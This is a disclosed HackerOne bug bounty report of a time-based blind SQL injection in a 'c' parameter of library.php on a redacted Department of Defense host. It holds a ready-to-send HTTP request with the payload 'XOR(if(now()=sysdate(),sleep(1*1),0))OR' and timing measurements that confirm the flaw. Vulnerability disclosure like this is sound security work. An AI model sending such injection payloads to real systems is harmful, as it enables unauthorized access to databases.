# [SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter

## Report Details
- **Report ID**: 1024984
- **URL**: https://hackerone.com/reports/1024984
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-11-03T04:17:44.917Z
- **Disclosed**: 2020-11-23T18:07:06.967Z

## Reporter
- **Username**: testfortesttest
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Step-by-step Reproduction Instructions
 copy the request to your burp suite :
````
GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
Host: ██████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Connection: close
````

```
payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis
```

██████████


```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis
```
████████

```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis
```
███


This issue is same to #995122

## Impact

SQL Injection

## Attachments
No attachments
